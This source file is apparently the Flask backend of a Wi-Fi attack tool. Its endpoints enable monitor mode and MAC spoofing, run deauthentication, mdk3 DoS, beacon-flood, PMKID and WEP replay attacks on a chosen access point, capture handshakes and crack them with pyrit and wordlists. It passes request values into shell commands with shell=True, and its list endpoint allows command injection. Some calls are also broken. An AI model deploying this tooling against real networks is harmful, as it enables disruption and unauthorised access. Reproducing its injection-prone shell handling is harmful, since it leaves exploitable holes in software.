import csv
import re
import threading
from time import sleep
from markupsafe import escape
from werkzeug.utils import secure_filename
from flask import request, jsonify, make_response, session
from app import app, config, socketio
import subprocess

Essid = None

@app.get('/')
def index():
    return "OK"

@app.get('/netcard')
def getNetcardMon():
    bash_command = 'iwconfig 2>&1 | grep "ESSID" | while read netcard text; do echo "$netcard"; done'
    output = subprocess.run(bash_command, check=True, shell=True, capture_output=True)
    
    return make_response(jsonify({"cards": f"{output.stdout}"}), 200)

@app.post('/netcard')
def setNetcardMon():
    netcard = escape(request.form['netcard'])
    netcardMon = netcard + "mon"
    session["netcardMon"] = netcardMon
    mac = f"{config['mac']['oui']}:12:8c:b6"
    session["mac"] = mac

    startMon = f'airmon-ng check kill && airmon-ng start {netcard}'
    subprocess.run(startMon, check=True, shell=True)

    changeMac = f'ifconfig {netcardMon} down &&  macchanger --mac={mac} {netcardMon} && ifconfig {netcardMon} up'
    subprocess.run(changeMac, check=True, shell=True)
    
    return  make_response(jsonify({"netcard": f"{netcardMon}", "mac": f"{mac}"}), 200)

@app.get('/stop')
def stopNetcardMon():
    session['scanning'] = False
    netcardMon = session.get("netcardMon") 

    stopServices = f'killall airodump-ng && airmon-ng stop {netcardMon} && systemctl start NetworkManager.service'
    subprocess.run(stopServices, check=True, shell=True)

    return make_response("OK",200)

def readScan():
    path = config['server']['filePath']
    scans = []
    while session.get("scanning"):
        with open(f"dumpData-01.csv", "r") as csvfile:
            scanData = csv.reader(csvfile)

            for row in scanData:
                length = len(row)
                
                if length > 0:
                    if is_mac_addres(row[0]) and (length > 0):
                        bssidStation = row[0]
                        for station in scans:
                            if station["bssidStation"] == bssidStation:
                                continue
                        if is_mac_addres(row[5]) and (length == 7):   #Clients lines
                            bssidClient = row[5].replace(" ", "")
                            for station in scans:
                                if station["bssidStation"] == bssidClient:
                                    print(station["bssidStation"])
                                    for client in station["clients"]:
                                        if client == bssidStation:
                                            continue
                                    station["clients"].append(bssidStation)

                        elif length == 15:                       #Stations lines
                            channelStation = row[3]
                            essidStation = row[13]
                            scan = {
                                "bssidStation": bssidStation,
                                "essidStation": essidStation,
                                "channelStation": channelStation,
                                "clients": []
                                }
                            scans.append(scan)
        print(scans) 
        socketio.emit('data', scans)
        sleep(2)
    clean(path=path)
    #TODO:Actualizar con websockets


@app.get('/scan')
def scan():
    netcardMon = session.get('netcardMon') 
    path = config['server']['filePath']
    session["path"] = path

    startScan = f'airodump-ng -w {path}/dumpData --output-format csv {netcardMon}'
    subprocess.Popen(startScan, check=True, shell=True)

    session['scanning'] = True
    threading.Thread(target=readScan).start()
           
    return make_response("", 200)


@app.post('/target')
def target():
    session['bssid'] = escape(request.form['bssid'])
    session['essid'] = escape(request.form['essid'])
    session['channel'] = escape(request.form['channel'])
    #TODO: Plantear target... aislado o conjunto??
    return make_response(200)

@app.post('/attack/<int:id>')
def attack(id):
    nPackets = escape(request.form['n'])
    netcardMon = session.get('netcardMon')
    bssid = session.get('bssid')
    channel = session.get('channel')
    path = session.get('path')

    
    startScan = f'airodump-ng -w {path}/dumpDataAttack --bssid {bssid} --channel {channel} {netcardMon}'
    subprocess.Popen(startScan, shell=True)

    match id:
        #WPA/WPA2 With Clients
        case 0: #Deauthentication
            attack = f'aireplay-ng -0 {nPackets} -a {bssid} {netcardMon}'
            pass
        case 1: #Fake DoS Attack
            attack = f'mdk3 a -a {bssid} {netcardMon}'
            pass
        case 2: #Beacon Flood Mode Attack
            fakeNets = escape(request.form['fn'])
            attack = f'mdk3 b -f {fakeNets} -a -s 1000 -c {channel} {netcardMon}'
            pass
        case 3: #Disassociation Amok Mode Attack
            attack = f'mdk3 d -w blacklist -c 1 {netcardMon}'
            pass
        case 4: #Michael Shutdown Explotation
            attack = f'mdk3 m -t {bssid} {netcardMon}'
            pass

        #WPA/WPA2 Without Clients
        case 5: #PMKID
            attack = f'hcxdumptool -i {netcardMon} -o captura --enable_status=1'
            extract = f'hcxpcaptool -z hashes captura'
            pass

        #WPS
        case 6: #TODO
            attack = f''
            pass

        #WEP
        case 7: #Fake Authentication Attack
            attack = f'aireplay-ng -1 0 -a {bssid} -h {session["mac"]} {netcardMon} && aireplay-ng -2 -p 0841 -b {bssid} -h {session["mac"]} {netcardMon}'
            pass
        case 8: #ARP Replay Attack
            attack = f'aireplay-ng -b {bssid} -3 -n {nPackets} -x 1000 -h {session["mac"]} {netcardMon}'
            pass
 
    
    subprocess.run(attack, check=True, shell=True)

    #Comprobar handshake
    checkHandshake = subprocess.run(f'pyrit -r {path}/dumpDataAttack-01.cap analyze', check=True, shell=True)
    
    #1 -> HS no valido ; 0 -> HS valido
    if checkHandshake.returncode == 1:
        return make_response("HS not captured", 400)


    #Finish scan
    stopNetcardMon()

    #Extraer handshake
    extractHash = f"aircrack-ng -J {path}/captureHS {path}/dumpDataAttack-01.cap && hccap2john {path}/captureHS.hccap > {path}/hash"
    subprocess.run(extractHash, check=True, shell=True)

    clean(True, path)
    return make_response("Hash generated", 200)

###Cracking

##Cracking con Pyrit a través de ataque por Base de Datos RAINBOW TABLE
@app.post('/crack/<string:wordlist>')
def cracker(wordlist):
    path = session.get('path')
    essid = session.get('essid')

    #Define DB
    defineDB = f'pyrit -i wordlist/{wordlist} import_passwords'
    subprocess.run(defineDB, check=True, shell=True)

    #Define ESSID
    defineDB = f'pyrit -e {essid} create_essid'
    subprocess.run(defineDB, check=True, shell=True)

    #Generate PMKs
    generatePMKS = 'pyrit batch'
    subprocess.run(generatePMKS, check=True, shell=True)

    #Start cracking
    startAttack =  f'pyrit -r {path}/dumpDataAttack-01.cap attack_db > hashes/{essid}'
    subprocess.run(startAttack, check=True, shell=True)

    return make_response("", 200)


###Uploads

##Upload wordlists or fakeNetworks
@app.post('/list/<string:list>')
def setWordlist(list):
    f = request.files['file']
    f.save(f'{list}/{secure_filename(f.filename)}')
    
    return make_response(f"saved on {list}/{secure_filename(f.filename)}")

@app.get('/list/<string:list>')
def getWordlists(list):
    ls = f'ls {list}'
    output = subprocess.run(ls, check=True, capture_output=True, text=True, shell=True)
    
    ls = output.stdout

    response_data = {"ls": f"{ls}"}
    response = jsonify(response_data)
    response_code = 200


    return make_response(response, response_code)

def is_mac_addres(mac):
    return bool(re.match('^\s*' + '[\:\-]'.join(['([0-9a-f]{2})'] * 6) + '\s*$', mac.lower()))

def clean(attack:False, path):
    if attack: clean = f'rm {path}/captureHS.hccap {path}/dumpDataAttack-01*'
    else: clean = f'rm {path}/dumpData-01.csv'

    subprocess.run(clean, check=True, text=True, shell=True)